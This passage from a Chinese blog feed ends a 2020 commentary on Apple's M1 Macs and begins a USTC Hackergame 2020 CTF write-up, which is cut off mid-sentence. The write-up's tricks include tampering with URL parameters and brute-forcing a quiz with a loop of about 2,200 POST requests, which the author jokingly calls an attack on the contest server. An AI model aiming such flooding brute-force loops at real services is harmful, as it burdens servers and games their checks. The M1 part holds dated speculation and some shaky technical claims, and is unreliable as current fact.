排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2'20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3'18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13'，相比上一代搭载了 Intel i7 的 MacBook Pro 13'，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3'19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13' 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13' 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13' 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12' Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div>谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-11</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/1.png\" width=\"508\" height=\"417\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/2.png\" width=\"794\" height=\"327\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/25.png\" width=\"636\" height=\"277\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/3.png\" width=\"482\" height=\"393\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/4.png\" width=\"680\" height=\"888\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/5.png\" width=\"1862\" height=\"712\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>...... <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>......</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/21.png\" width=\"1423\" height=\"781\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/22.png\" width=\"800\" height=\"440\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/23.png\" width=\"800\" height=\"440\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/24.png\" width=\"1067\" height=\"586\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>......</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/26.png\" width=\"919\" height=\"936\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>......</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>......</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to 